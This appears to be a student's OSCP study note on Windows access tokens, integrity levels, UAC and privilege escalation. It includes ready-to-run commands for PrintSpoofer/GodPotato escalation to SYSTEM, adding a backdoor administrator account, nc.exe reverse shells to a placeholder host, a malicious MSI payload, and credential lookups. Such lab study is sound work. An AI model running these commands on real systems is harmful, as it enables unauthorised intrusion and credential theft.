# Windows Tokens, Integrity, UAC, and Dangerous Privileges

## Security model quick reference

### SID

Windows identifies users/groups internally by **Security Identifier (SID)**, not by username. Useful well-known examples:

```text
S-1-1-0    Everyone
S-1-5-11   Authenticated Users
S-1-5-18   Local System
...-500    Administrator RID
```

### Access tokens

After authentication, Windows creates an access token describing the user's security context, including the user's SID, group SIDs, and privileges.

- **Primary token** — attached to a process/thread and normally reflects the user's security context.
- **Impersonation token** — lets a thread act using another security context.

### Mandatory Integrity Control

Common integrity levels:

```text
System  → SYSTEM / kernel-level context
High    → elevated administrator
Medium  → standard user / non-elevated admin process
Low     → restricted / sandbox-like context
```

A lower-integrity process cannot write to a higher-integrity object even when normal permissions would otherwise appear to allow it.

Check the current token/groups/integrity information:

```powershell
whoami /groups
```

### UAC

With User Account Control, an administrative user normally operates with a **filtered standard-user token** for non-privileged work and uses the full administrator token only after elevation/consent. Being a member of Administrators therefore does not automatically mean every process is running at High integrity.

---

## Token privileges (`whoami /priv`)

```powershell
whoami /priv
```

| Privilege | Exploit / use path |
| --- | --- |
| `SeImpersonatePrivilege` | PrintSpoofer / Potato-style token impersonation → SYSTEM |
| `SeAssignPrimaryToken` | May enable token-based process creation/escalation |
| `SeBackupPrivilege` | Read protected files / credential material |
| `SeDebugPrivilege` | Debug/dump privileged processes such as LSASS |
| `SeLoadDriverPrivilege` | Potential malicious/vulnerable driver path |

**Important:** a privilege listed as `Disabled` is still **assigned** to the token; it only means the current process has not enabled/requested it. Do not ignore a privilege just because its current state says Disabled.

## SeImpersonatePrivilege and named pipes

`SeImpersonatePrivilege` allows a process to impersonate an authenticated client under the right conditions. Chapter 16's escalation pattern is:

```text
low-privileged service account has SeImpersonatePrivilege
        ↓
attacker controls a named pipe
        ↓
coerce a privileged process / SYSTEM to authenticate to it
        ↓
impersonate captured privileged token
        ↓
launch command as SYSTEM
```

This privilege is commonly encountered after compromising Windows services such as IIS because service identities often receive it.

### PrintSpoofer — Chapter 16 example

```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
whoami
```

Expected successful context:

```text
nt authority\system
```

### Other Potato-style options already in this checklist

```powershell
# GodPotato (SeImpersonate)
.\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add && net localgroup administrators hax /add"

# PrintSpoofer reverse-shell style payload
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd"
```

PEN-200 also mentions Potato-family variants such as RottenPotato, SweetPotato, and JuicyPotato as alternatives to study.

---

## Other Windows privilege-escalation checks already useful on OSCP

### AlwaysInstallElevated — check BOTH keys

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both are enabled:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i C:\Temp\evil.msi
```

### Autologon credentials in registry

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

### PowerShell history

Use the fuller Chapter 16 workflow in [[Windows Enumeration and Sensitive Information#6. PowerShell history and logging artifacts]]. Quick path:

```powershell
(Get-PSReadLineOption).HistorySavePath
type (Get-PSReadLineOption).HistorySavePath
```

### Stored credentials

```cmd
cmdkey /list
runas /savecred /user:Administrator "C:\Temp\nc.exe <LHOST> 4444 -e cmd"
```

### Unquoted service paths

Use the full validation workflow in [[Windows Service Abuse#3. Unquoted Service Paths]]. Quick discovery:

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

## Metasploit cross-reference

For the Metasploit mapping of these concepts (`getsystem`, UAC-bypass modules using `SESSION`, process integrity, and `migrate`), see [[Basics/Metasploit/Meterpreter & Post-Exploitation|Meterpreter & Post-Exploitation]].
